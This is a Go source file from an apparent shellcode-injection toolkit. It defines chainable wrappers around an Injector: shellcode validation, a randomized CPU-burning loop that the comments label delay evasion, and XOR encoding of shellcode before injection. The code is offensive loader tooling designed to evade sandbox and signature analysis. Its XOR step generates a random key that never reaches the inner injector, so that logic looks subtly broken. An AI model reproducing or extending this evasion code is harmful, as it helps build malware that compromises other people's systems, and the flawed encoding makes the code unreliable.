package inject

import (
	"crypto/rand"
	"fmt"
	"math/big"
)

// WithValidation wraps an Injector with shellcode validation.
// Returns an error before delegating if shellcode is empty.
func WithValidation(inner Injector) Injector {
	return &validatingInjector{inner: inner}
}

type validatingInjector struct {
	inner Injector
}

func (v *validatingInjector) Inject(shellcode []byte) error {
	if err := validateShellcode(shellcode); err != nil {
		return err
	}
	return v.inner.Inject(shellcode)
}

// InjectedRegion forwards to the wrapped injector when it implements
// SelfInjector; otherwise reports no region.
func (v *validatingInjector) InjectedRegion() (Region, bool) {
	return forwardRegion(v.inner)
}

// CPUDelayConfig controls CPU-based delay evasion.
type CPUDelayConfig struct {
	// MaxIterations is the upper bound for random iteration count.
	// Default: 5_000_000.
	MaxIterations int64

	// FallbackIterations is used if random generation fails.
	// Default: 3_000_000.
	FallbackIterations int64
}

// DefaultCPUDelayConfig returns sensible defaults.
func DefaultCPUDelayConfig() CPUDelayConfig {
	return CPUDelayConfig{
		MaxIterations:      5_000_000,
		FallbackIterations: 3_000_000,
	}
}

// WithCPUDelay wraps an Injector with a CPU-intensive delay before injection.
// Uses default iteration counts. For custom counts, use WithCPUDelayConfig.
func WithCPUDelay(inner Injector) Injector {
	return WithCPUDelayConfig(DefaultCPUDelayConfig())(inner)
}

// WithCPUDelayConfig returns a MiddlewareFunc with configurable iteration counts.
//
// Example:
//
//	inject.Chain(base,
//	    inject.WithCPUDelayConfig(inject.CPUDelayConfig{
//	        MaxIterations: 10_000_000,
//	    }),
//	)
func WithCPUDelayConfig(cfg CPUDelayConfig) MiddlewareFunc {
	if cfg.MaxIterations <= 0 {
		cfg.MaxIterations = 5_000_000
	}
	if cfg.FallbackIterations <= 0 {
		cfg.FallbackIterations = 3_000_000
	}
	return func(inner Injector) Injector {
		return &cpuDelayInjector{inner: inner, cfg: cfg}
	}
}

type cpuDelayInjector struct {
	inner Injector
	cfg   CPUDelayConfig
}

func (d *cpuDelayInjector) Inject(shellcode []byte) error {
	cpuDelayN(d.cfg.MaxIterations, d.cfg.FallbackIterations)
	return d.inner.Inject(shellcode)
}

// InjectedRegion forwards to the wrapped injector when it implements
// SelfInjector; otherwise reports no region.
func (d *cpuDelayInjector) InjectedRegion() (Region, bool) {
	return forwardRegion(d.inner)
}

// XORConfig controls XOR encoding behavior.
type XORConfig struct {
	// Key is the XOR key byte. If zero, a random key is generated.
	Key byte

	// RandomKey forces random key generation even if Key is set.
	// Default: true (when using WithXOR).
	RandomKey bool
}

// WithXOR wraps an Injector with XOR encoding using a random key.
// For a fixed key, use WithXORConfig.
func WithXOR(inner Injector) Injector {
	return WithXORConfig(XORConfig{RandomKey: true})(inner)
}

// WithXORKey returns a MiddlewareFunc that XOR-encodes with a specific key.
func WithXORKey(key byte) MiddlewareFunc {
	return WithXORConfig(XORConfig{Key: key})
}

// WithXORConfig returns a MiddlewareFunc with configurable XOR behavior.
func WithXORConfig(cfg XORConfig) MiddlewareFunc {
	return func(inner Injector) Injector {
		return &xorInjector{inner: inner, cfg: cfg}
	}
}

type xorInjector struct {
	inner Injector
	cfg   XORConfig
}

func (x *xorInjector) Inject(shellcode []byte) error {
	key := x.cfg.Key
	if x.cfg.RandomKey || key == 0 {
		k := make([]byte, 1)
		if _, err := rand.Read(k); err != nil {
			return fmt.Errorf("XOR key generation: %w", err)
		}
		key = k[0]
	}

	encoded := make([]byte, len(shellcode))
	copy(encoded, shellcode)
	for i := range encoded {
		encoded[i] ^= key
	}
	return x.inner.Inject(encoded)
}

// InjectedRegion forwards to the wrapped injector when it implements
// SelfInjector; otherwise reports no region.
func (x *xorInjector) InjectedRegion() (Region, bool) {
	return forwardRegion(x.inner)
}

// forwardRegion is the common helper used by decorators to expose the
// wrapped injector's self-process region without imposing that the inner
// injector be a SelfInjector.
func forwardRegion(inner Injector) (Region, bool) {
	if si, ok := inner.(SelfInjector); ok {
		return si.InjectedRegion()
	}
	return Region{}, false
}

// MiddlewareFunc is a function that wraps an Injector.
type MiddlewareFunc func(Injector) Injector

// Chain applies a sequence of middleware decorators to an Injector.
// Middlewares are applied in order: the first middleware is the outermost wrapper.
//
// Example:
//
//	injector := inject.Chain(
//	    baseInjector,
//	    inject.WithValidation,
//	    inject.WithCPUDelayConfig(inject.CPUDelayConfig{MaxIterations: 10_000_000}),
//	    inject.WithXORKey(0x41),
//	)
func Chain(base Injector, middlewares ...MiddlewareFunc) Injector {
	result := base
	// Apply in reverse so the first middleware is outermost
	for i := len(middlewares) - 1; i >= 0; i-- {
		result = middlewares[i](result)
	}
	return result
}

// cpuDelayN runs a CPU-intensive loop with configurable iteration bounds.
func cpuDelayN(maxIterations, fallbackIterations int64) {
	iterations, err := rand.Int(rand.Reader, big.NewInt(maxIterations))
	if err != nil {
		iterations = big.NewInt(fallbackIterations)
	}
	limit := iterations.Int64()
	var counter int64
	for counter < limit {
		counter++
		_ = counter * 2
	}
}
